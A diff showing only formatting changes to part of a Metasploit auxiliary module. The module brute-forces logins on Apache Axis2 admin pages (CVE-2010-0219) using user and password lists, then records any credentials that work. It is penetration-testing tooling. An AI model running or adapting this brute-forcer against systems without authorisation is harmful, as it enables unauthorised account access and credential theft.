@@ -12,29 +12,26 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-
   def initialize
     super(
-      'Name'           => 'Apache Axis2 Brute Force Utility',
-      'Description'    => %q{
+      'Name' => 'Apache Axis2 Brute Force Utility',
+      'Description' => %q{
         This module attempts to login to an Apache Axis2 instance using
         username and password combinations indicated by the USER_FILE,
         PASS_FILE, and USERPASS_FILE options. It has been verified to
         work on at least versions 1.4.1 and 1.6.2.
       },
-      'Author'         =>
-        [
-          'Leandro Oliveira <leandrofernando[at]gmail.com>'
-        ],
-      'References'     =>
-        [
-          [ 'CVE', '2010-0219' ],
-          [ 'OSVDB', '68662'],
-        ],
-      'License'        => MSF_LICENSE
+      'Author' => [
+        'Leandro Oliveira <leandrofernando[at]gmail.com>'
+      ],
+      'References' => [
+        [ 'CVE', '2010-0219' ],
+        [ 'OSVDB', '68662'],
+      ],
+      'License' => MSF_LICENSE
     )
 
-    register_options( [
+    register_options([
       Opt::RPORT(8080),
       OptString.new('TARGETURI', [false, 'Path to the Apache Axis Administration page', '/axis2/axis2-admin/login']),
     ])
@@ -51,8 +48,8 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Verifying login exists at #{target_url}")
     begin
       send_request_cgi({
-        'method'  => 'GET',
-        'uri'     => uri
+        'method' => 'GET',
+        'uri' => uri
       }, 20)
     rescue => e
       print_error("Failed to retrieve Axis2 login page at #{target_url}")
@@ -82,8 +79,8 @@ class MetasploitModule < Msf::Auxiliary
     scanner.scan! do |result|
       credential_data = result.to_h
       credential_data.merge!(
-          module_fullname: self.fullname,
-          workspace_id: myworkspace_id
+        module_fullname: self.fullname,
+        workspace_id: myworkspace_id
       )
       case result.status
       when Metasploit::Model::Login::Status::SUCCESSFUL
@@ -105,9 +102,6 @@ class MetasploitModule < Msf::Auxiliary
         invalidate_login(credential_data)
       end
     end
-
   end
-
-
 
 end
